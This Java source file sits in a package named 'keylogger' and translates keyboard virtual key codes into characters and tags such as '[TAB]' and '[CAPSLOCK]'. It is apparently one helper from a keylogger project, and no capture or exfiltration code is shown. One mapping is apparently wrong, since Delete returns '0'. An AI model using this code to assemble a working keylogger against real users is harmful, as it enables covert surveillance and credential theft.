package keylogger;

import de.ksquared.system.keyboard.KeyEvent;

public class ConvertVirtualKeyCodeToKeyBoardCode {
    public String GetKeyBoardCode(KeyEvent event){
        String kb_code = "";
	if(event.getVirtualKeyCode()==KeyEvent.VK_0){
            kb_code = "0";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_1){
            kb_code = "1";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_2){
            kb_code = "2";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_3){
            kb_code = "3";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_4){
            kb_code = "4";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_5){
            kb_code = "5";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_6){
            kb_code = "6";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_7){
            kb_code = "7";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_8){
            kb_code = "8";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_9){
            kb_code = "9";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_A){
            kb_code = "A";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_B){
            kb_code = "B";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_C){
            kb_code = "C";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_D){
            kb_code = "D";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_E){
            kb_code = "E";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_F){
            kb_code = "F";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_G){
            kb_code = "G";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_H){
            kb_code = "H";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_I){
            kb_code = "I";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_J){
            kb_code = "J";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_K){
            kb_code = "K";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_L){
            kb_code = "L";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_M){
            kb_code = "M";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_N){
            kb_code = "N";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_O){
            kb_code = "O";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_P){
            kb_code = "P";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_Q){
            kb_code = "Q";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_R){
            kb_code = "R";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_S){
            kb_code = "S";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_T){
            kb_code = "T";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_U){
            kb_code = "U";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_V){
            kb_code = "V";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_W){
            kb_code = "W";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_X){
            kb_code = "X";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_Y){
            kb_code = "Y";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_Z){
            kb_code = "Z";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_DELETE){
            kb_code = "0";
        }else if(event.getVirtualKeyCode()==KeyEvent.VK_SPACE){
            kb_code = " ";
        }else if(String.valueOf(event.getVirtualKeyCode()).equals("8")){
            kb_code = "[BACKSPACE]";
        }else if(String.valueOf(event.getVirtualKeyCode()).equals("9")){
            kb_code = "[TAB]";
        }else if(String.valueOf(event.getVirtualKeyCode()).equals("27")){
            kb_code = "[ESC]";
        }else if(String.valueOf(event.getVirtualKeyCode()).equals("20")){
            kb_code = "[CAPSLOCK]";
        }else if(String.valueOf(event.getVirtualKeyCode()).equals("164")){
            kb_code = "[ALT]";
        }
        return kb_code;
    }
}